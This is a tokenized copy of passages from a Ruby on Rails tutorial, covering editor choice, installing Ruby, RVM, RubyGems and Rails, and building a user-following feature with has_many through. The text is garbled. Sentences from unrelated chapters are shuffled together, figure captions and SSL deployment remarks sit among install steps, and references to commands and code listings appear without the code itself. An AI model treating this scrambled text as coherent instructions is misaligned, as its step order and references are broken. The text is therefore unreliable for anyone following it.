▁The ▁root ▁directory ▁for ▁any ▁given ▁app ▁is ▁known ▁as ▁the ▁\ emph { Rails ▁root }, ▁but ▁this ▁terminology ▁is ▁confusing ▁and ▁many ▁people ▁mistake n ly ▁believe ▁that ▁the ▁`` Rails ▁root '' ▁is ▁the ▁root ▁directory ▁for ▁Rails ▁itself .
▁/ Users / mhartl / rails _ projects / sample _ app / config
▁/ Users / mhartl / rails _ projects / sample _ app / config / routes . rb
▁Some ▁commands ▁may ▁produce ▁errors ▁depending ▁on ▁your ▁system ; ▁rather ▁than ▁attempt ▁the ▁\ href { http :// en . wiki p edia . org / wiki / S is y ph us }{ S is y ph e an } ▁task ▁of ▁document ing ▁all ▁such ▁errors ▁in ▁this ▁tutorial , ▁I ▁will ▁delegate ▁to ▁the ▁`` G oo g le ▁the ▁error ▁message '' ▁algorithm , ▁which ▁a mong ▁other ▁things ▁is ▁good ▁practice ▁for ▁real - life ▁software ▁development .
▁=> ▁ { : success =>" It ▁work ed !" , ▁error : ▁" It ▁failed . "}
▁If ▁you ▁run ▁into ▁any ▁problem s ▁while ▁following ▁the ▁tutorial , ▁I ▁suggest ▁consult ing ▁the ▁resources ▁list ed ▁on ▁the ▁\ href { http :// railstutorial . org / help }{ Rails ▁Tutorial ▁help ▁page }
▁I ▁think ▁of ▁Chapter ▁1 ▁as ▁the ▁`` we ed ing ▁out ▁p has e '' ▁in ▁ la w ▁ school --- if ▁you ▁can ▁get ▁your ▁ dev ▁environment ▁set ▁up , ▁the ▁rest ▁is ▁easy ▁to ▁get ▁through .
▁ --- B ob ▁C a ve z z a , ▁\ emph { Rails ▁Tutorial } ▁reader
▁It ' s ▁time ▁now ▁to ▁get ▁going ▁with ▁a ▁Ruby ▁on ▁Rails ▁development ▁environment ▁and ▁our ▁first ▁application .
▁There ▁is ▁quite ▁a ▁bit ▁of ▁overhead ▁here , ▁es pecially ▁if ▁you ▁don ' t ▁have ▁ ext en s ive ▁programming ▁experience , ▁so ▁don ' t ▁get ▁d is c our age d ▁if ▁it ▁take s ▁a ▁while ▁to ▁get ▁started .
▁It ' s ▁not ▁just ▁you ; ▁every ▁developer ▁go es ▁through ▁it ▁( of t en ▁more ▁than ▁once ), ▁but ▁rest ▁as s ur ed ▁that ▁the ▁effort ▁will ▁be ▁rich ly ▁re w ar d ed .
▁Consider ing ▁ various ▁id io s y n c ra tic ▁customizations , ▁there ▁are ▁ probably ▁as ▁many ▁development ▁environments ▁as ▁there ▁are ▁Rails ▁programmer s , ▁but ▁there ▁are ▁at ▁least ▁two ▁broad ▁types : ▁text ▁editor / command ▁line ▁environments , ▁and ▁integrat ed ▁development ▁environments ▁( ID E s ).
▁Let ' s ▁consider ▁the ▁latter ▁first .
▁The ▁most ▁pro m in ent ▁Rails ▁IDE s ▁are ▁\ href { http :// www . ap t an a . com / rails /}{ R ad Rails } ▁and ▁\ href { http :// www . j et b ra in s . com / ruby / index . html }{ Ruby M ine }.
▁I ' ve ▁he ar d ▁es pecially ▁good ▁things ▁about ▁Ruby M ine , ▁and ▁one ▁reader ▁( David ▁L o e ff ler ) ▁has ▁as s em b l ed ▁\ href { https :// github . com / perfect ion ist / sample _ project / wiki }{ not es ▁on ▁how ▁to ▁use ▁Ruby M ine ▁with ▁this ▁tutorial }
▁If ▁you ' re ▁com for table ▁using ▁an ▁IDE , ▁I ▁suggest ▁tak ing ▁a ▁look ▁at ▁the ▁options ▁mentioned ▁to ▁see ▁what ▁fit s ▁with ▁the ▁way ▁you ▁work .
▁Text ▁editor s ▁and ▁command ▁lines
▁Calvin ▁navigate s ▁to ▁the ▁profile ▁of ▁a ▁second ▁user , ▁Thomas ▁Hobbes ▁( F igure ~\ ref { fig : page _ flow _ other _ profile _ follow _ button _ mockup }), ▁click ing ▁on ▁the ▁`` Follow '' ▁button ▁to ▁follow ▁that ▁user .
▁Whi ch ▁combination ▁you ▁use ▁depend s ▁on ▁your ▁taste s ▁and ▁your ▁platform .
▁As ▁of ▁this ▁writing , ▁\ href { http :// www . s ublime text . com / 3 }{ S ublime ▁Text ~3 } ▁is ▁in ▁be t a .
▁I ▁recommend ▁try ing ▁the ▁new est ▁S ublime ▁Text ▁only ▁if ▁you ▁really ▁want ▁to ▁be ▁on ▁the ▁b le ed ing ▁edge .
▁The ▁current ▁user ' s ▁profile . ~\ href { http :// railstutorial . org / images / figures / page _ flow _ profile _ mockup _ bootstrap - full . png }{ ( full ▁size )}
▁S ublime ▁Text ▁is ▁heav ily ▁in f l u ence d ▁by ▁\ href { http :// m ac r o m ate s . com }{ TextMate }, ▁and ▁in ▁fact ▁is ▁compatib le ▁with ▁most ▁ TextMate ▁customizations , ▁such ▁as ▁ s n ip p et s ▁and ▁color ▁ scheme s .
▁Find ing ▁a ▁user ▁to ▁follow . ~\ href { http :// railstutorial . org / images / figures / page _ flow _ user _ index _ mockup _ bootstrap - full . png }{ ( full ▁size )}
▁( TextMate , ▁which ▁is ▁available ▁only ▁on ▁OS ~ X , ▁is ▁ still ▁a ▁good ▁choice ▁if ▁you ▁use ▁a ▁Mac .)
▁The ▁profile ▁of ▁a ▁user ▁to ▁follow , ▁with ▁a ▁follow ▁button . ~\ href { http :// railstutorial . org / images / figures / page _ flow _ other _ profile _ follow _ button _ mockup _ bootstrap - full . png }{ ( full ▁size )}
▁The ▁ v i ▁editor ▁is ▁one ▁of ▁the ▁most ▁an ci ent ▁yet ▁powerful ▁we ap on s ▁in ▁the ▁Unix ▁a r s en al , ▁and ▁Vi m ▁is ▁`` v i ▁improve d ''.
▁S ublime ▁Text ▁can ▁be ▁obtain ed ▁com m er cial ly , ▁whereas ▁Vi m ▁can ▁be ▁obtain ed ▁at ▁no ▁co st ; ▁both ▁are ▁in d us t rial - strength ▁editor s , ▁but ▁in ▁my ▁experience ▁S ublime ▁Text ▁is ▁\ emph { much } ▁more ▁accessible ▁to ▁beginners .
▁A ▁profile ▁with ▁an ▁unfollow ▁button ▁and ▁increment ed ▁followers ▁count . ~\ href { http :// railstutorial . org / images / figures / page _ flow _ other _ profile _ unfollow _ button _ mockup _ bootstrap - full . png }{ ( full ▁size )}
▁On ▁L in u x , ▁the ▁default ▁terminal ▁is ▁fine .
▁The ▁Home ▁page ▁with ▁status ▁feed ▁and ▁increment ed ▁following ▁count . ~\ href { http :// railstutorial . org / images / figures / page _ flow _ home _ page _ feed _ mockup _ bootstrap - full . png }{ ( full ▁size )}
▁On ▁Windows , ▁many ▁users ▁prefer ▁to ▁develop ▁Rails ▁applications ▁in ▁a ▁virtual ▁machine ▁running ▁L in u x , ▁in ▁which ▁case ▁your ▁command - line ▁options ▁reduce ▁to ▁the ▁previous ▁case .
▁If ▁you ▁decide ▁to ▁use ▁S ublime ▁Text , ▁you ▁m ight ▁want ▁to ▁follow ▁the ▁optional ▁setup ▁instructions ▁for ▁\ href { https :// github . com / mhartl / rails _ tutorial _ s ublime _ text }{ Rails ▁Tutorial ▁S ublime ▁Text }
▁As ▁we ▁will ▁see , ▁there ▁is ▁a ▁problem ▁with ▁this ▁approach , ▁and ▁we ' ll ▁learn ▁how ▁to ▁fix ▁it ▁using ▁\ k ode { has \_ many ▁through }.
▁( S u ch ▁configuration ▁settings ▁can ▁be ▁f id d ly ▁and ▁error - prone , ▁so ▁I ▁main ly ▁recommend ▁them ▁for ▁more ▁advanced ▁users ; ▁S ublime ▁Text ▁is ▁an ▁excellent ▁choice ▁for ▁editing ▁Rails ▁applications ▁even ▁without ▁the ▁advanced ▁setup .)
▁A ▁text ▁editor / command ▁line ▁development ▁environment . ▁\ href { http :// railstutorial . org / images / figures / edit or _ s hel l - full . png }{ ( full ▁size )}
▁A lthough ▁there ▁are ▁many ▁web ▁browsers ▁to ▁choose ▁from , ▁the ▁ v as t ▁major ity ▁of ▁Rails ▁programmer s ▁use ▁Firefox , ▁Safari , ▁or ▁Chrome ▁when ▁developing .
▁All ▁three ▁browsers ▁include ▁a ▁built - in ▁`` In spec t ▁element '' ▁feature ▁available ▁by ▁right - ▁( or ▁control - ) click ing ▁on ▁any ▁part ▁of ▁the ▁page .
▁A ▁note ▁about ▁tool s
▁We ▁could ▁call ▁them ▁\ emph { following }, ▁but ▁that ' s ▁a m b ig u ous : ▁in ▁normal ▁English , ▁a ▁`` following '' ▁is ▁the ▁set ▁of ▁people ▁following ▁\ emph { you }, ▁i . e . , ▁your ▁followers --- exactly ▁the ▁oppos ite ▁of ▁the ▁intend ed ▁meaning .
▁In ▁the ▁process ▁of ▁getting ▁your ▁development ▁environment ▁up ▁and ▁running , ▁you ▁may ▁find ▁that ▁you ▁sp end ▁a ▁\ emph { lo t } ▁of ▁time ▁getting ▁everything ▁just ▁right .
▁A lthough ▁we ▁will ▁use ▁`` following '' ▁as ▁a ▁ label , ▁as ▁in ▁`` 50 ▁following , ▁7 5 ▁followers '' , ▁we ' ll ▁use ▁`` followed ▁users '' ▁for ▁the ▁users ▁themselves , ▁with ▁a ▁corresponding ▁\ k ode { user . followed \_ users } ▁array
▁The ▁learning ▁process ▁for ▁editor s ▁and ▁IDE s ▁is ▁particular ly ▁long ; ▁you ▁can ▁sp end ▁ week s ▁on ▁S ublime ▁Text ▁or ▁Vi m ▁tutorial s ▁ al one .
▁The ▁first ▁edition ▁of ▁this ▁book ▁used ▁the ▁\ k ode { user . following } ▁terminology , ▁which ▁even ▁I ▁found ▁confusing ▁at ▁time s .
▁If ▁you ' re ▁new ▁to ▁this ▁game , ▁I ▁want ▁to ▁as s ure ▁you ▁that ▁\ emph { s pending ▁time ▁learning ▁tool s ▁is ▁normal }.
▁T hanks ▁to ▁reader ▁Co s m o ▁L e e ▁for ▁con v in c ing ▁me ▁to ▁change ▁the ▁terminology ▁and ▁for ▁offer ing ▁suggest ion s ▁on ▁how ▁to ▁make ▁it ▁clear er .
▁Every one ▁go es ▁through ▁it .
▁Sometimes ▁it ▁is ▁f ru str at ing , ▁and ▁it ' s ▁easy ▁to ▁get ▁i m patient ▁when ▁you ▁have ▁an ▁a we some ▁web ▁app ▁in ▁your ▁ head ▁and ▁you ▁\ emph { j us t ▁want ▁to ▁learn ▁Rails ▁already }, ▁but ▁have ▁to ▁sp end ▁a ▁ week ▁learning ▁some ▁we ir d ▁an ci ent ▁Unix ▁editor ▁just ▁to ▁get ▁started .
▁( I ▁did n ' t ▁follow ▁his ▁exact ▁a d v ic e , ▁though , ▁so ▁if ▁it ' s ▁ still ▁confusing ▁he ▁be ar s ▁non e ▁of ▁the ▁b la me .)
▁P r ac tic ally ▁all ▁the ▁software < n > in ▁the ▁world ▁is ▁either ▁broken ▁or ▁very ▁difficult ▁to ▁use .
▁Having ▁ developed ▁the ▁User ▁model ▁and ▁the ▁signup ▁functionality , ▁now ▁is ▁a ▁good ▁time ▁to ▁deploy ▁the ▁sample ▁application ▁to ▁production .
▁S ince ▁\ k ode { user . followed \_ users } ▁should ▁be ▁an ▁array ▁of ▁users , ▁each ▁row ▁of ▁the ▁\ k ode { followed \_ users } ▁table ▁would ▁need ▁to ▁be ▁a ▁user , ▁as ▁identifie d ▁by ▁the ▁\ k ode { followed \_ id }, ▁together ▁with ▁the ▁\ k ode { follower \_ id } ▁to ▁establish ▁the ▁association
▁So ▁users ▁d read ▁software .
▁They ' ve ▁been ▁tr a in ed ▁that ▁when ever ▁they ▁try ▁to ▁install ▁something , ▁or ▁even ▁fill ▁out ▁a ▁form ▁online , ▁it ' s ▁not ▁going ▁to ▁work .
▁In ▁addition , ▁since ▁each ▁row ▁is ▁a ▁user , ▁we ▁would ▁need ▁to ▁include ▁the ▁user ' s ▁other ▁attributes , ▁including ▁the ▁name , ▁password , ▁etc .
▁ --- P a ul ▁G ra h am , ▁in ▁\ emph { F ound ers ▁at ▁Work } ▁by ▁ J es s ic a ▁L i v ing s to n
▁Now ▁it ' s ▁time ▁to ▁install ▁Ruby ▁and ▁Rails .
▁I ' ve ▁done ▁my ▁best ▁to ▁cover ▁as ▁many ▁base s ▁as ▁possible , ▁but ▁systems ▁var y , ▁and ▁many ▁things ▁can ▁go ▁wrong ▁during ▁these ▁steps .
▁Be ▁sure ▁to ▁Google ▁the ▁error ▁message ▁or ▁consult ▁the ▁\ href { http :// railstutorial . org / help }{ Rails ▁Tutorial ▁help ▁page } ▁if ▁you ▁run ▁into ▁trouble .
▁To ▁get ▁the ▁deployment ▁to ▁work , ▁we ▁first ▁need ▁to ▁add ▁a ▁line ▁for c ing ▁the ▁use ▁of ▁SSL ▁in ▁production .
▁In st all ▁Rails
▁One ▁way ▁to ▁find ▁the ▁proper ▁abstract ion ▁is ▁to ▁consider ▁how ▁we ▁m ight ▁implement ▁the ▁act ▁of ▁\ emph { following } ▁in ▁a ▁web ▁application .
▁Un less ▁otherwise ▁noted , ▁you ▁should ▁use ▁the ▁exact ▁versions ▁of ▁all ▁software ▁used ▁in ▁the ▁tutorial , ▁including ▁Rails ▁itself , ▁if ▁you ▁want ▁the ▁same ▁results .
▁Sometimes ▁minor ▁version ▁difference s ▁will ▁yield ▁identical ▁results , ▁but ▁you ▁should n ' t ▁count ▁on ▁this , ▁es pecially ▁with ▁re spec t ▁to ▁Rails ▁versions .
▁in ▁Listing ~\ ref { code : ssl _ in _ production }.
▁The ▁main ▁exception ▁is ▁Ruby ▁itself : ▁ 1.9.3 ▁and ▁2 . 0 . 0 ▁are ▁virtual ly ▁identical ▁for ▁the ▁purposes ▁of ▁this ▁tutorial , ▁so ▁feel ▁free ▁to ▁use ▁either ▁one .
▁Rails ▁Installer ▁( W in do w s )
▁A ▁user ▁the n ▁\ k ode { has \_ many ▁: relationships }, ▁and ▁has ▁many ▁\ k ode { followed \_ users } ▁( or ▁\ k ode { followers }) ▁\ emph { through } ▁these ▁relationships .
▁If ▁you ▁are ▁using ▁Windows , ▁go ▁to ▁\ href { http :// rails install er . org /}{ Rails ▁Installer } ▁and ▁ download ▁the ▁Rails ▁Installer ▁executable ▁and ▁view ▁the ▁excellent ▁installation ▁video .
▁More over , ▁by ▁consider ing ▁\ emph { reverse } ▁relationships , ▁we ▁could ▁use ▁the ▁\ k ode { follower \_ id } ▁column ▁to ▁extract ▁an ▁array ▁of ▁user ' s ▁followers .
▁To ▁make ▁a ▁\ k ode { followed \_ users } ▁array ▁of ▁users , ▁it ▁would ▁be ▁possible ▁to ▁pull ▁out ▁an ▁array ▁of ▁\ k ode { followed \_ id } ▁attributes ▁and ▁the n ▁find ▁the ▁user ▁for ▁each ▁one .
▁To ▁fix ▁this , ▁I ▁a m ▁current ly ▁working ▁with ▁N ic ▁and ▁Way n e ▁to ▁create ▁a ▁list ▁of ▁Rails ▁Installer s ▁order ed ▁by ▁Rails ▁version ▁number .
▁As ▁you ▁m ight ▁expect , ▁though , ▁Rails ▁has ▁a ▁way ▁to ▁make ▁this ▁ procedure ▁more ▁convenient , ▁and ▁the ▁relevant ▁technique ▁is ▁known ▁as ▁\ k ode { has \_ many ▁through }.
▁In st all ▁Git
▁Because ▁its ▁use ▁is ▁ u b i quit ous , ▁you ▁should ▁install ▁Git ▁even ▁at ▁this ▁ early ▁stage ; ▁I ▁suggest ▁following ▁the ▁installation ▁instructions ▁for ▁your ▁platform ▁at ▁the ▁\ href { http :// www . git - sc m . com / book / en / Getting - S t ar t ed - Installing - G it }{ Installing ▁Git ▁section ▁of ▁\ emph { Pro ▁Git } }.
▁This ▁code ▁automatically ▁ populate s ▁\ k ode { user . followed \_ users } ▁with ▁an ▁array ▁of ▁followed ▁users .
▁( You ▁m ight ▁see ▁some ▁deprecation ▁warning s ▁at ▁this ▁point , ▁which ▁you ▁should ▁ignore .)
▁In st all ▁Ruby
▁F inally , ▁we ▁need ▁to ▁set ▁up ▁SSL ▁on ▁the ▁remote ▁server .
▁The ▁next ▁step ▁is ▁to ▁install ▁Ruby .
▁Configur ing ▁a ▁production ▁site ▁to ▁use ▁SSL ▁is ▁p a in ful ▁and ▁error - prone , ▁and ▁a mong ▁other ▁things ▁it ▁involve s ▁purchas ing ▁an ▁\ emph { SSL ▁c er t if ic ate } ▁for ▁your ▁domain .
▁( This ▁can ▁be ▁p a in ful ▁and ▁error - prone , ▁and ▁I ▁actually ▁d read ▁ having ▁to ▁install ▁new ▁versions ▁of ▁Ruby , ▁but ▁ u nfortunately ▁it ' s ▁the ▁co st ▁of ▁doing ▁ business .)
▁It ' s ▁possible ▁that ▁your ▁system ▁already ▁has ▁Ruby ▁installed .
▁L uckily , ▁for ▁an ▁application ▁running ▁on ▁a ▁Heroku ▁domain ▁( such ▁as ▁the ▁sample ▁application ), ▁we ▁can ▁p ig g y back ▁on ▁Heroku ' s ▁SSL ▁c er t if ic ate , ▁a ▁feature ▁that ▁is ▁included ▁automatically ▁as ▁part ▁of ▁the ▁Heroku ▁platform .
▁T ry ▁running
▁If ▁you ▁want ▁to ▁run ▁SSL ▁on ▁a ▁custom ▁domain , ▁such ▁as ▁\ k ode { example . com }, ▁you ' ll ▁have ▁no ▁choice ▁but ▁to ▁end ure ▁some ▁p a in , ▁which ▁you ▁can ▁read ▁about ▁on ▁\ href { http :// dev center . heroku . com / articles / ssl }{ Heroku ' s ▁page ▁on ▁SSL }.
▁to ▁see ▁the ▁version ▁number .
▁( In ▁particular , ▁it ▁won ' t ▁work ▁Ruby ▁1. 8 . 7 .)
▁You ▁should ▁feel ▁free ▁to ▁visit ▁the ▁signup ▁page ▁and ▁create ▁a ▁new ▁user ▁at ▁this ▁time .
▁This ▁tutorial ▁assume s ▁that ▁most ▁readers ▁are ▁using ▁Ruby ~ 1.9.3 ▁or ▁2 . 0 . 0, ▁but ▁Ruby ▁1.9 . 2 ▁should ▁work ▁as ▁well .
▁If ▁you ▁have ▁trouble , ▁try ▁running
▁A ▁model ▁of ▁followed ▁users ▁through ▁user ▁relationships .
▁As ▁part ▁of ▁install ing ▁Ruby , ▁if ▁you ▁are ▁using ▁OS ~ X ▁or ▁L in u x ▁I ▁ strong ly ▁recommend ▁using ▁\ href { http :// rvm . io /}{ Ruby ▁ Version ▁M an age r ▁( R V M )} ▁or ▁\ href { https :// github . com / s st e phens on / rb env }{ rb env }, ▁which ▁allow ▁you ▁to ▁install ▁and ▁manage ▁multiple ▁versions ▁of ▁Ruby ▁on ▁the ▁same ▁machine .
▁To ▁get ▁started ▁with ▁the ▁implementation , ▁we ▁first ▁generate ▁a ▁Relationship ▁model ▁as ▁follows :
▁( The ▁\ href { http :// github . com / ve r t ig in ous / p i k }{ P i k } ▁project ▁accomplish es ▁a ▁similar ▁f e at ▁on ▁Windows .)
▁This ▁is ▁particular ly ▁important ▁if ▁you ▁want ▁to ▁run ▁different ▁versions ▁of ▁Ruby ▁or ▁Rails ▁on ▁the ▁same ▁machine .
▁It ' s ▁possible ▁that ▁this ▁will ▁generate ▁a ▁Relationship ▁ factory , ▁which ▁you ▁should ▁remove :
▁U nfortunately , ▁RVM ▁and ▁ rb env ▁can ' t ▁be ▁used ▁on ▁the ▁same ▁system ▁simul t an e ous ly , ▁and ▁since ▁I ' ve ▁been ▁using ▁RVM ▁longer ▁that ' s ▁the ▁one ▁I ▁use ▁in ▁this ▁tutorial .
▁If ▁you ▁have n ' t ▁used ▁I R C ▁before , ▁I ▁suggest ▁you ▁start ▁by ▁search ing ▁the ▁web ▁for ▁`` ir c ▁client ▁< your ▁platform > ''.
▁T w o ▁good ▁native ▁clients ▁for ▁OS ~ X ▁are ▁\ href { http :// co ll o q u y . info /}{ Co ll o q u y } ▁and ▁\ href { http :// li me cha t . net / m ac /}{ L i me C h at }.
▁As ▁a ▁pre r equ i site , ▁OS ~ X ▁users ▁may ▁need ▁to ▁install ▁the ▁ X code ▁developer ▁tool s .
▁To ▁avoid ▁the ▁( huge ) ▁full ▁installation , ▁I ▁recommend ▁the ▁much ▁small er ▁\ href { https :// de ve lo p er . app le . com / download s /}{ Co m m and ▁L ine ▁To ol s ▁for ▁ X code }
▁To ▁get ▁started ▁with ▁the ▁Ruby ▁installation , ▁first ▁\ href { http :// rvm . io / rvm / install /}{ install ▁RVM } :
▁( If ▁you ▁have ▁RVM ▁installed , ▁you ▁should ▁run
▁to ▁ensure ▁that ▁you ▁have ▁the ▁latest ▁version .)
▁You ▁can ▁the n ▁get ▁Ruby ▁set ▁up ▁by ▁examining ▁the ▁requirements ▁for ▁install ing ▁it :
▁On ▁my ▁system , ▁I ▁ha d ▁to ▁install ▁the ▁following ▁( using ▁\ href { http :// m x c l . github . com / home brew /}{ Home brew }, ▁a ▁package ▁manage ment ▁system ▁for ▁OS ~ X ) :
▁On ▁L in u x , ▁you ▁can ▁accomplish ▁similar ▁things ▁with ▁\ k ode { ap t - get } ▁or ▁\ k ode { y um }.
▁I ▁also ▁ha d ▁to ▁install ▁a ▁\ href { https :// en . wiki p edia . org / wiki / YAML }{ YAML } ▁library :
▁How ▁ detailed ▁you ▁want ▁to ▁make ▁your ▁tests ▁is ▁up ▁to ▁you ; ▁a ▁suggest ed ▁template ▁appears ▁in ▁Listing ~\ ref { code : flash _ test }.
▁F inally , ▁I ▁needed ▁to ▁tell ▁RVM ▁where ▁Open SSL ▁was ▁located ▁when ▁install ing ▁Ruby ~ 2 . 0 . 0 :
▁< w a it ▁a ▁while >
▁in ▁Listing ~\ ref { code : relationship _ create _ test }.
▁Testing ▁Relationship ▁creation ▁and ▁attributes .
▁U nfortunately , ▁lot s ▁of ▁things ▁can ▁go ▁wrong ▁along ▁the ▁way .
▁See ▁the ▁discussion ▁on ▁\ href { http :// stack overflow . com / questions / 5 3 59 5 58 / when - to - use - rspec - let }{ when ▁to ▁use ▁let ▁at ▁S t ac k ▁Over flow } ▁for ▁more ▁information .
▁I ' ve ▁done ▁my ▁best ▁to ▁cover ▁some ▁of ▁the ▁most ▁common ▁cases , ▁but ▁the ▁only ▁general ▁solution ▁is ▁web ▁search es ▁and ▁ de ter m in ation .
▁We ▁original ly ▁used ▁instance ▁variables ▁both ▁because ▁instance ▁variables ▁are ▁important ▁to ▁introduce ▁ early ▁and ▁because ▁\ k ode { let } ▁is ▁a ▁little ▁more ▁advanced .
▁After ▁install ing ▁Ruby , ▁you ▁should ▁configure ▁your ▁system ▁for ▁the ▁other ▁software ▁needed ▁to ▁run ▁Rails ▁applications .
▁as ▁show n ▁in ▁Listing ~\ ref { code : user _ relationships _ method _ test }.
▁This ▁typical ly ▁involve s ▁install ing ▁\ emph { gem s }, ▁which ▁are ▁self - contain ed ▁package s ▁of ▁Ruby ▁code .
▁Testing ▁for ▁the ▁\ k ode { user . relationships } ▁attribute .
▁S ince ▁gems ▁with ▁different ▁version ▁number s ▁some times ▁con f li c t , ▁it ▁is ▁often ▁convenient ▁to ▁create ▁separate ▁\ emph { gem set s }, ▁which ▁are ▁self - contain ed ▁bundle s ▁of ▁gems .
▁For ▁the ▁purposes ▁of ▁this ▁tutorial , ▁I ▁suggest ▁creating ▁a ▁gem set ▁called ▁\ k ode { railstutorial \_ rails \_ 4 \_ 0 } :
▁Using ▁/ Users / mhartl / . rvm / gem s / ruby - 2 . 0 . 0 - p 0 ▁with ▁gem set ▁ railstutorial _ rails _4_0
▁( In cidentally , ▁the ▁inverse ▁of ▁\ k ode { underscore } ▁is ▁\ k ode { camelize }, ▁which ▁convert s ▁\ k ode {" c am el \_ case "} ▁to ▁\ k ode {" CamelCase "} .)
▁as ▁show n ▁in ▁Listing ~\ ref { code : user _ relationships _ association }.
▁For ▁more ▁information ▁on ▁RVM , ▁I ▁also ▁recommend ▁tak ing ▁a ▁look ▁at ▁the ▁article ▁\ href { http :// str and code . com / 20 1 3 / 07 / 11 / ruby - version - manager - rvm - overview - for - rails - new b s /}{ Ruby ▁ Version ▁M an age r ▁( R V M ) ▁Over view ▁for ▁Rails ▁ New b s }
▁If ▁you ' ve ▁notice d ▁that ▁\ k ode { followed \_ id } ▁also ▁identifie s ▁a ▁user , ▁and ▁are ▁concern ed ▁about ▁the ▁as y m me tr ic ▁treat ment ▁of ▁followed ▁and ▁follower , ▁you ' re ▁a head ▁of ▁the ▁game .
▁In st all ▁RubyGems
▁Implement ing ▁the ▁user / relationships ▁\ k ode { has \_ many } ▁association .
▁RubyGems ▁is ▁a ▁package ▁ manager ▁for ▁Ruby ▁project s , ▁and ▁there ▁are ▁many ▁useful ▁libraries ▁( including ▁Rails ) ▁available ▁as ▁Ruby ▁package s , ▁or ▁\ emph { gem s }.
▁ Installing ▁RubyGems ▁should ▁be ▁easy ▁once ▁you ▁install ▁Ruby .
▁in ▁Listing ~\ ref { code : relationships _ belongs _ to _ test }.
▁In ▁fact , ▁if ▁you ▁have ▁\ href { http :// rvm . io / rvm / install /}{ install ed ▁RVM }, ▁you ▁already ▁have ▁RubyGems , ▁since ▁RVM ▁includes ▁it ▁automatically :
▁If ▁you ▁don ' t ▁already ▁have ▁it , ▁you ▁should ▁\ href { http :// rubygems . org / pages / download }{ download ▁RubyGems }, ▁extract ▁it , ▁and ▁the n ▁go ▁to ▁the ▁\ k ode { rubygems } ▁directory ▁and ▁run ▁the ▁setup ▁program :
▁Testing ▁the ▁user / relationships ▁\ k ode { belongs \_ to } ▁association .
▁If ▁you ▁already ▁have ▁RubyGems ▁installed , ▁you ▁should ▁make ▁sure ▁your ▁system ▁uses ▁the ▁version ▁used ▁in ▁this ▁tutorial :
▁To ▁write ▁the ▁application ▁code , ▁we ▁define ▁the ▁\ k ode { belongs \_ to } ▁relationship ▁as ▁usual .
▁Rails ▁infer s ▁the ▁names ▁of ▁the ▁foreign ▁keys ▁from ▁the ▁corresponding ▁symbols ▁( i . e . , ▁\ k ode { follower \_ id } ▁from ▁\ k ode { : follower }, ▁and ▁\ k ode { followed \_ id } ▁from ▁\ k ode { : followed }), ▁but ▁since ▁there ▁is ▁ n either ▁a ▁Follow ed ▁no r ▁a ▁Follow er ▁model ▁we ▁need ▁to ▁supply ▁the ▁class ▁name ▁\ k ode { User }.
▁F re e z ing ▁your ▁system ▁to ▁this ▁particular ▁version ▁will ▁help ▁prevent ▁conflicts ▁as ▁RubyGems ▁changes ▁in ▁the ▁future .
▁The ▁result ▁is ▁show n ▁in ▁Listing ~\ ref { code : relationship _ belongs _ to }.
▁When ▁install ing ▁gems , ▁by ▁default ▁RubyGems ▁generates ▁two ▁different ▁kind s ▁of ▁documentation ▁( called ▁ r i ▁and ▁ rdoc ), ▁but ▁many ▁Ruby ▁and ▁Rails ▁developers ▁find ▁that ▁the ▁time ▁to ▁build ▁them ▁is n ' t ▁worth ▁the ▁benefit .
▁Note ▁that , ▁unlike ▁the ▁default ▁generated ▁Relationship ▁model , ▁in ▁this ▁case ▁only ▁the ▁\ k ode { followed \_ id } ▁is ▁accessible .
▁( M any ▁programmer s ▁rely ▁on ▁online ▁documentation ▁instead ▁of ▁the ▁native ▁ r i ▁and ▁ rdoc ▁document s .)
▁ Adding ▁the ▁\ k ode { belongs \_ to } ▁associations ▁to ▁the ▁Relationship ▁model .
▁in ▁Listing ~\ ref { code : gem r c }.
▁in ▁Listing ~\ ref { code : relationship _ create _ test } ▁and
▁Creat ing ▁a ▁gem ▁configuration ▁file .
▁Here ▁\ k ode { sub l } ▁is ▁the ▁command - line ▁command ▁to ▁ la un ch ▁S ublime ▁Text ▁on ▁OS ~ X , ▁which ▁you ▁can ▁set ▁up ▁using ▁the ▁\ href { http :// www . s ublime text . com / doc s / 2 / o s x _ command _ line . html }{ S ublime ▁Text ~ 2 ▁documentation ▁for ▁the ▁OS ~ X ▁command ▁line }.
▁If ▁you ' re ▁on ▁a ▁different ▁platform , ▁or ▁if ▁you ' re ▁using ▁a ▁different ▁editor , ▁you ▁should ▁replace ▁this ▁command ▁as ▁necessary ▁( i . e . , ▁by ▁double - click ing ▁the ▁application ▁icon ▁or ▁by ▁using ▁an ▁alternate ▁command ▁such ▁as ▁\ k ode { m ate }, ▁\ k ode { v i m }, ▁\ k ode { g v i m }, ▁or ▁\ k ode { m v i m }).
▁For ▁brevity , ▁throughout ▁the ▁rest ▁of ▁this ▁tutorial ▁I ' ll ▁use ▁\ k ode { sub l } ▁as ▁a ▁shorthand ▁for ▁`` open ▁with ▁your ▁favor ite ▁text ▁editor . ''
▁S up pre s s ing ▁the ▁ r i ▁and ▁ rdoc ▁documentation ▁in ▁\ k ode { . gem r c }.
▁On ce ▁you ' ve ▁installed ▁RubyGems , ▁install ing ▁Rails ▁should ▁be ▁easy .
▁We ▁come ▁now ▁to ▁the ▁he ar t ▁of ▁the ▁Relationship ▁associations : ▁\ k ode { followed \_ users } ▁and ▁\ k ode { followers }.
▁This ▁tutorial ▁standard ize s ▁on ▁Rails ~4.0 , ▁which ▁we ▁can ▁install ▁as ▁follows :
▁as ▁show n ▁in ▁Listing ~\ ref { code : user _ following _ test }.
▁To ▁check ▁your ▁Rails ▁installation , ▁run ▁the ▁following ▁command ▁to ▁ print ▁out ▁the ▁version ▁number :
▁A ▁test ▁for ▁the ▁\ k ode { user . followed \_ users } ▁attribute .
▁As ▁of ▁this ▁writing , ▁those ▁difference s ▁are ▁not ▁relevant , ▁but ▁in ▁the ▁future , ▁as ▁the ▁current ▁Rails ▁version ▁ div er ge s ▁from ▁the ▁one ▁used ▁in ▁this ▁tutorial , ▁these ▁difference s ▁may ▁become ▁significant .
▁If ▁you ' re ▁running ▁L in u x , ▁you ▁m ight ▁have ▁to ▁install ▁a ▁couple ▁of ▁other ▁package s ▁at ▁this ▁point :
▁By ▁default , ▁in ▁a ▁\ k ode { has \_ many ▁through } ▁association ▁Rails ▁look s ▁for ▁a ▁foreign ▁key ▁corresponding ▁to ▁the ▁singular ▁version ▁of ▁the ▁association ; ▁in ▁other ▁words , ▁code ▁like
▁would ▁as s em b le ▁an ▁array ▁using ▁the ▁\ k ode { followed \_ id } ▁in ▁the ▁\ k ode { relationships } ▁table .
